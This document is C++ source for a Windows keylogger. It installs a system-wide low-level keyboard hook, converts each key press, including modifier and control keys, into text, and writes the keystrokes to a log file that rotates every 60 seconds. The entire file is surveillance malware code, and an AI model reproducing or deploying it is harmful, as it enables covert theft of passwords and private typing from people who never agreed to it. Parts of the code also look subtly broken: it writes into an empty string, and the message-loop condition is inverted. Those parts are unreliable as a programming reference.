#include "Keylogger.h"

time_t start, end;
#define NEW_FILE_NUM_SECONDS 60 
static LPCWSTR current_filename;

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	wchar_t currentKey[10];
	std::wstring buffer = L"";

	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
			int code = p->vkCode;

			switch (code)
			{
			case VK_RCONTROL:
				buffer = L"[R-CTRL]";
				break;
			case VK_LCONTROL:
				buffer = L"[L-CTRL]";
				break;
			case VK_RMENU:
				buffer = L"[R-ALT]";
				break;
			case VK_LMENU:
				buffer = L"[L-ALT]";
				break;
			case VK_LSHIFT:
				buffer = L"[L-SHIFT]";
				break;
			case VK_RSHIFT:
				buffer = L"[R-SHIFT]";
				break;
			case VK_ESCAPE:
				buffer = L"[ESC]";
				break;
			case VK_DELETE:
				buffer = L"[DELETE]";
				break;
			case VK_BACK:
				buffer = L"[BACKSPACE]";
				break;
			case VK_TAB:
				buffer = L"[TAB]";
				break;
			case VK_RETURN:
				buffer = L"[ENTER]\n";
				break;
			case VK_DECIMAL:
				buffer = L".";
				break;
			default:
				buffer[0] = code;
			}
			writeToFile((wchar_t*)buffer.c_str(), current_filename);
		}
	}
	time(&end);
	if (difftime(end, start) >= NEW_FILE_NUM_SECONDS)
		PostQuitMessage(0);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD keylogger(LPCWSTR filename)
{
	time(&start);
	time(&end);
	current_filename = filename;

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, 0, 0)) // pulls the message from the queue and fills in the MSG structure
	{
		// translates keystrokes (key down, key up) into characters
		TranslateMessage(&msg);
		if (difftime(end, start) >= NEW_FILE_NUM_SECONDS)
		{
			UnhookWindowsHookEx(hook);
			break;
		}
		// tells the operating system to call the window procedure of 
		// the window that is the target of the message
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
	return 0;
}

